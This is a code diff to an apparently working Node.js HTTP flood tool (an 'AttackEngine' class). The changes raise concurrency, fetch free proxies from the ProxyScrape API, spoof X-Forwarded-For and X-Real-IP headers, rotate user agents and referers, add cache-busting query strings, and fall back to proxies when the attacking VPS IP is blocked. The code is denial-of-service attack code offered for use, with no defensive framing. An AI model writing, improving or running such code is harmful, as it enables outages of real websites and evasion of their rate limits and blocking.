@@ -5,7 +5,7 @@ const http = require('http');
 const https = require('https');
 const process = require('process');
 
-const MAX_CONCURRENT = Math.min(os.cpus().length * 100, 1540);
+const MAX_CONCURRENT = Math.min(os.cpus().length * 100, 2000); // adjust if needed
 const REQUEST_TIMEOUT = 8000;
 
 function loadLines(filename) {
@@ -21,10 +21,21 @@ function loadLines(filename) {
 
 const REFERERS = loadLines('refs.txt');
 const USER_AGENTS = loadLines('ua.txt');
-const PROXIES = loadLines('proxies.txt');
 
-const UA_POOL = Array.from({ length: 10000 }, () =>
-    USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] || 'Mozilla/5.0');
+// Fetch proxies from ProxyScrape API
+async function fetchProxies() {
+    try {
+        const response = await axios.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all');
+        return response.data.split('\n').map(proxy => proxy.trim()).filter(proxy => proxy);
+    } catch (error) {
+        console.error('Error fetching proxies:', error.message);
+        return [];
+    }
+}
+
+// Proxies fallback list
+let PROXIES = [];
+fetchProxies().then(proxies => PROXIES = proxies);
 
 const keepAliveHttp = new http.Agent({ keepAlive: true });
 const keepAliveHttps = new https.Agent({ keepAlive: true });
@@ -45,22 +56,23 @@ class AttackEngine {
     }
 
     getRandomUA() {
-        this.uaIndex = (this.uaIndex + 1) % UA_POOL.length;
-        return UA_POOL[this.uaIndex];
+        this.uaIndex = (this.uaIndex + 1) % USER_AGENTS.length;
+        return USER_AGENTS[this.uaIndex];
     }
 
     getRandomReferer() {
         return REFERERS[Math.floor(Math.random() * REFERERS.length)] || 'https://google.com';
     }
 
-    async makeRequest() {
+    // Function to make request with fallback to proxy
+    async makeRequest(useProxy = false) {
         const randomIP = Array(4).fill(0).map(() => Math.floor(Math.random() * 255) + 1).join('.');
         const headers = {
             'User-Agent': this.getRandomUA(),
             'Referer': this.getRandomReferer(),
             'X-Forwarded-For': randomIP,
             'X-Real-IP': randomIP,
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
             'Accept-Encoding': 'gzip, deflate, br',
             'Accept-Language': 'en-US,en;q=0.9',
             'Cache-Control': 'no-cache',
@@ -69,30 +81,29 @@ class AttackEngine {
             'Upgrade-Insecure-Requests': '1'
         };
 
-        const urlWithNoise = this.target + (this.target.includes('?') ? '&' : '?') + `cb=${Math.random().toString(36).substring(2, 12)}`;
+        const urlWithNoise = this.target + (this.target.includes('?') ? '&' : '?') + `cb=${Math.random().toString(36).substring(2, 15)}`;
 
-        const proxyLine = PROXIES[Math.floor(Math.random() * PROXIES.length)];
-        const [host, port] = proxyLine.split(':');
+        let proxy = null;
+        if (useProxy && PROXIES.length > 0) {
+            proxy = PROXIES[Math.floor(Math.random() * PROXIES.length)];
+        }
+
+        const agent = useProxy && proxy ? new http.Agent({ proxy: { host: proxy.split(':')[0], port: proxy.split(':')[1] } }) : keepAliveHttp;
 
         try {
             const response = await axios.get(urlWithNoise, {
                 headers,
                 timeout: REQUEST_TIMEOUT,
-                httpAgent: keepAliveHttp,
+                httpAgent: agent,
                 httpsAgent: keepAliveHttps,
-                validateStatus: null,
-                proxy: {
-                    host,
-                    port: parseInt(port)
-                }
+                validateStatus: null
             });
-
             if (response.status === 200) {
                 this.stats.success++;
                 return;
             }
         } catch {
-            // ignored
+            // Proxy fallback will be triggered on failure
         }
 
         this.stats.errors++;
@@ -109,7 +120,14 @@ class AttackEngine {
     async workerLoop() {
         while (this.running && Date.now() - this.startTime < this.duration) {
             this.stats.total++;
-            await this.makeRequest();
+
+            // Default to VPS IP for most requests
+            await this.makeRequest(false); // VPS IP preferred
+
+            // Fall back to proxy if failure occurs
+            if (this.stats.errors > 0) {
+                await this.makeRequest(true); // Use proxy if VPS IP gets blocked or throttled
+            }
         }
     }
 
